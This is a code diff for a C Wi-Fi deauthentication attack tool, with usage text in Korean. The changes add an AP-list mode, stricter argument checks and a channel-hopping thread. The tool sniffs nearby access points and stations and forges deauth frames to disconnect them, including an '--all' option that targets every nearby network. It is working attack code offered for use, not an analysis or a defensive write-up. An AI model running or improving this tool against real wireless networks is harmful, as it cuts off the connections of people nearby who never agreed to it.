@@ -13,13 +13,20 @@
 int death_Particular_flag = 0, death_all_flag = 0, death_ap_flag = 0, death_stationList_flag = 0, death_whiteList_flag = 0;
 
 void usage(){
-        printf("syntax: deauth-attack-whitelist <interface> -ap <ap mac> -stationList <station_mac_list> -whiteList <white_list>\n");
-        printf("sample: deauth-attack-whitelist wlan0 -ap AA:BB:CC:DD:EE:FF -stationList station_mac.txt -whiteList white_list.txt  \n");
+        printf("syntax: deauth-attack <interface> [-apList <ap_mac_list.txt>] [-ap <ap mac> -stationList <station_mac_list> -whiteList <white_list>] [--all] \n");
+        printf("\t-apList : AP mac 주소를 적어놓은 txt 파일\n");
+        printf("\t-ap : 하나의 AP 주소\n");
+        printf("\t-stationList : station(AP와 연결되는 주변 기기)의 주소를 적어놓은 txt 파일\n");
+        printf("\t-whiteList : AP와 연결을 해제시키지 않을 mac주소를 적어놓은 txt 파일\n");
+        printf("\t--all : 주변의 모든 AP와 모든 station을 연결 해제시키는 옵션\n\n");
+        printf("sample [1]: deauth-attack wlan0 -apList AP_list.txt \n");
+        printf("sample [2]: deauth-attack wlan0 -ap AA:BB:CC:DD:EE:FF -stationList station_mac.txt -whiteList white_list.txt \n");
+        printf("sample [3]: deauth-attack wlan0 --all \n\n");
 }
 
 void init_setting(int argc, char* argv[]){
-    for(int i=1; i < argc; i++){
-        if(strcmp(argv[i],"--all")==0) death_all_flag = i;
+    for(int i=0; i < argc; i++){
+        if(strcmp(argv[i], "--all")==0) death_all_flag = i;
         if(strcmp(argv[i], "-apList")==0) death_Particular_flag = i;
         if(strcmp(argv[i], "-ap")==0) death_ap_flag = i;
         if(strcmp(argv[i], "-stationList")==0) death_stationList_flag = i;
@@ -70,13 +77,11 @@ int set_bssid(FILE* pFile, char * bssid){
     return 0;
 }
 
-int check_mac_list(FILE* pFile, char *mac){
+bool check_mac_list(FILE* pFile, char *mac){
     char strTemp[20] = {0,};
     while(!feof(pFile)){
         fgets(strTemp, sizeof(strTemp),pFile);
-        if(strcmp(mac, strTemp)==0){
-            return 1;
-        }
+        if(strcmp(mac, strTemp)==0) return 1;
     }
     return 0;
 }
@@ -118,7 +123,7 @@ void *ap_mac(void *dev) {
 
         radiotap_len = dump_radiotap((struct radiotap_header *)packet);
         packet += radiotap_len;
-        smac = dump_beacon_header((struct IEEE_802dot11 *)packet);
+        smac = dump_probe_request((struct IEEE_802dot11 *)packet);
 
         if (smac == NULL) continue;
         char mac[20];
@@ -198,7 +203,7 @@ void *station_mac(void *arg) {
             printf("File(station_mac_list) not Found (thread2)\n");
             exit(0);
         }
-        flag = check_mac_list(pFile, mac);
+        if(check_mac_list(pFile, mac)) continue;
         fclose(pFile);
         
 
@@ -207,7 +212,7 @@ void *station_mac(void *arg) {
             printf("File(station_mac_list) not Found (thread2)\n");
             exit(0);
         }
-        flag = check_mac_list(pFile3, mac);
+        if(check_mac_list(pFile3, mac)) continue;
         fclose(pFile3);
 
 
@@ -230,15 +235,13 @@ void *station_mac(void *arg) {
 }
 
 
-
-
 int main(int argc, char* argv[]) {
     init_setting(argc, argv);
 
     int type = 0;
-    if(argc==4) type = 1;
-    else if(argc==8) type = 2;
-    else if(argc==3) type = 3;
+    if(argc==4 && death_Particular_flag!=0) type = 1;
+    else if(argc==8 && death_ap_flag!=0 && death_stationList_flag!=0 && death_whiteList_flag!=0) type = 2;
+    else if(argc==3 && death_all_flag!=0) type = 3;
     if (type == 0){
         usage();
         return -1;
@@ -246,10 +249,10 @@ int main(int argc, char* argv[]) {
 
     char errbuf[PCAP_ERRBUF_SIZE];
     char * dev = argv[1];
-    int num=0;
-    uint8_t macAddr[MAC_ALEN];
     char *ap_macAddr, *stationFile;
+    int num=0;
     FILE* pFile;
+    uint8_t macAddr[MAC_ALEN];
 
     monitor(dev);
 
@@ -260,8 +263,15 @@ int main(int argc, char* argv[]) {
     //if(death_Particular_flag != 0) char * ap_list = argv[death_Particular_flag + 1];
     //if(death_whiteList_flag != 0) char * whiteFile = argv[death_whiteList_flag + 1];
     //if(death_all_flag != 0) char * ap_list = argv[death_all_flag + 1];
-
-    if (type==2){
+    if (type == 1){
+        pFile = fopen(argv[death_Particular_flag + 1], "rb");
+        if (pFile == NULL){
+            printf("File not Found!\n");
+            exit(0);
+        }
+        memset(beacon_a2s.becon.dhost,0xff,sizeof(uint8_t)*6);
+    }
+    else if (type==2){
         ap_macAddr = argv[death_ap_flag + 1];
         stationFile = argv[death_stationList_flag + 1];
         struct multiargs multiarg;
@@ -275,7 +285,6 @@ int main(int argc, char* argv[]) {
             printf("File not Found!\n");
             exit(0);
         }
-
         if (ConvertMacAddrStr2Array(ap_macAddr, macAddr)){
             printf("Fail to convert MAC address 1\n");
             return -1;
@@ -285,15 +294,19 @@ int main(int argc, char* argv[]) {
         memcpy(beacon_s2a.becon.dhost, macAddr, 6);
 
     } else if(type==3){
-        FILE* pFile = fopen("ap_mac.txt", "wb"); //Create 'ap_mac.txt' File!
+        pFile = fopen("ap_mac.txt", "wb"); //Create 'ap_mac.txt' File!
         fclose(pFile);
 
         pthread_t thread;
         pthread_create(&thread, 0, ap_mac, (void *) dev);
-        //pthread_t thread2;
-        //pthread_create(&thread2, 0, thread_channel, (void *) dev);
+        pthread_t thread2;
+        pthread_create(&thread2, 0, thread_channel, (void *) dev);
 
         pFile = fopen("ap_mac.txt", "rb");
+        if (pFile == NULL){
+            printf("File not Found!\n");
+            exit(0);
+        }
         memset(beacon_a2s.becon.dhost,0xff,sizeof(uint8_t)*6);
     }
 
@@ -309,13 +322,15 @@ int main(int argc, char* argv[]) {
         char shost[20] = {0,};
         char dhost[20] = {0,};
         if (set_bssid(pFile, strTemp) == -1) continue;
-        
         if (ConvertMacAddrStr2Array(strTemp, macAddr)){
             printf("Fail to convert MAC address 2\n");
             return -1;
         }
         
-        if (type==2){
+        if(type==1){
+             memcpy(beacon_a2s.becon.shost, macAddr, 6);
+             memcpy(beacon_a2s.becon.bssid, macAddr, 6);
+        } else if (type==2){
             memcpy(beacon_a2s.becon.dhost, macAddr, 6);
             memcpy(beacon_s2a.becon.shost, macAddr, 6);
             memcpy(beacon_s2a.becon.bssid, macAddr, 6);
